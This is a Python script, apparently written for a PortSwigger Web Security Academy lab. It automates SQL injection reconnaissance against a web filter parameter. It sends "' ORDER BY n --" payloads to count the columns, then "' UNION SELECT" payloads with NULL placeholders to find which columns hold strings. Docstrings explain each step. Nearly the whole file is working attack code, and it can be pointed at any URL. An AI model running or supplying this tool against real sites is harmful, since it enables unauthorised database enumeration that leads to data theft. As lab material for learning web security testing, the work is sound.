#the payloads checks the number of columns and then showcase which column is a string
import requests
ORDERpayloads = ["' ORDER BY "]
def replaceNth(s,source,target,n):
    '''
    The function creates a list comprehension called inds to find all the starting indices where the source substring is found within the input string s. It checks if a substring of s starting from each index and having the same length as the source substring is equal to the source substring. The indices where this condition is true are stored in the inds list.
    The function checks if the length of the inds list is less than n. If so, it means there are not enough occurrences of the source substring to replace, and the function returns None or raises an error.
    The input string s is converted into a list of characters using the list() function. This is done because string objects are immutable in Python, and lists allow modifications.
    The nth occurrence index in the inds list is accessed by inds[n-1]. The n-1 index is used because Python lists are zero-based.
    The slice of the s list corresponding to the nth occurrence of the source substring is assigned the value of the target substring. This effectively replaces the source substring with the target substring.
    The modified list s is joined back into a string using the ''.join(s) method, and the resulting string is returned as the output of the function
    '''
    inds = [i for i in range(len(s) - len(source)+1) if s[i:i+len(source)]==source]
    if len(inds) < n:
        return None # or maybe raise an error
    s = list(s)#can't assign to string slices. So, let's lisfy
    s[inds[n-1]:inds[n-1]+len(source)] = target#do n-1 because we start from the first occurrence
    return ''.join(s)
def order_injection(url):
    '''
    It iterates through a range from 0 to 49 (inclusive) using a for loop.
    Inside the loop, it constructs an SQL injection query by concatenating the elements from the ORDER_payloads list, the current index i converted to a string, and " -- " (which is a comment in SQL to ignore the rest of the query).
    It sends a GET request to the specified url concatenated with the constructed query using the requests.get() method.
    If the response status code is 200 (indicating a successful request), it prints a message indicating that the column with index i is present.
    '''
    print("Try to find out the number of colums using ORDER BY")
    for i in range(1,50):# using this becuase hypothetically the is no database with 50 columns
        query = ORDERpayloads[0] + str(i) + " -- "
        r = requests.get(url + query)
        if r.status_code == 200:
            print("Column {} is present".format(i))
        else:
            print("Total number of columns are {}".format(i-1))#
            return i -1        
def stringcol(url,n):
    print("Trying which colmun is a string type:")
    #"UNION SELECT 'A',NULL...
    for i in range(1,n+1):
        query = "NULL,"*n
        query = query[0:-1]
        fullurl = replaceNth(query,"NULL","'a'",i)
        r = requests.get(url + "' UNION SELECT " + fullurl + " -- ")
        if r.status_code == 200:
            print("Column {} is a string type".format(i))
        else:
            pass

url = 'https://0af5005103a1536a82f8c45d009200b0.web-security-academy.net/filter?category=Pets'#this is where you paste the site to test the number of columns in the table.#this link is from port swigger
cols = order_injection(url)
stringcol(url,cols)